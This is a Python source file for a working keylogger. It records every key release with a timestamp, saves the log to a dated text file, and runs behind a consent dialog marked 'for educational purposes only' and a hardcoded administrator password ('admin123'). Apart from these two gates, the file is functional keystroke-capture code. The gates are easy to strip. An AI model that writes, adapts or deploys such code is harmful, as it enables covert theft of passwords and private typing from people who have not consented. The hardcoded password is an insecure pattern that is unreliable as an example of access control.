import keyboard
import datetime
import threading
import os
import tkinter as tk
from tkinter import messagebox, simpledialog


class Keylogger:
    def __init__(self, filename: str = "keylog.txt"):
        self.filename = filename
        self.log = []
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log.append((timestamp, name))

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        self.update_filename()
        with open(f"{self.filename}.txt", "w") as f:
            f.write("Time                 | Keystroke\n")
            f.write("--------------------|------------\n")
            for timestamp, key in self.log:
                f.write(f"{timestamp} | {key}\n")
        print(f"[+] Saved {self.filename}.txt")

    def start(self):
        self.start_dt = datetime.datetime.now()
        keyboard.on_release(callback=self.callback)
        print(f"[*] Keylogger started at {self.start_dt}")
        keyboard.wait()

    def stop(self):
        self.end_dt = datetime.datetime.now()
        print(f"[*] Keylogger stopped at {self.end_dt}")
        self.report_to_file()

        # Clear the log
        self.log = []


def request_permission():
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    message = ("This program will log all keystrokes. "
               "It is intended for educational purposes only. "
               "Do you give permission to run this keylogger?")

    return messagebox.askyesno("Permission Required", message)


def verify_admin():
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    # Setting a sample admin password.
    ADMIN_PASSWORD = "admin123"

    password = simpledialog.askstring("Administrator Verification",
                                      "Enter administrator password:",
                                      show='*')

    if password == ADMIN_PASSWORD:
        messagebox.showinfo("Success", "Administrator verified successfully.")
        return True
    else:
        messagebox.showerror("Error", "Incorrect password. Access denied.")
        return False


if __name__ == "__main__":
    if request_permission():
        if verify_admin():
            keylogger = Keylogger()

            # Start the keylogger in a separate thread
            keylogger_thread = threading.Thread(target=keylogger.start)
            keylogger_thread.start()

            print("Keylogger is running. Press 'esc' to stop...")
            keyboard.wait('esc')

            # Stop the keylogger
            keyboard.unhook_all()
            keylogger.stop()
            keylogger_thread.join()

            print("Keylogger stopped. Exiting program.")
        else:
            print("Administrator verification failed. The keylogger will not run.")
    else:
        print("Permission denied. The keylogger will not run.")
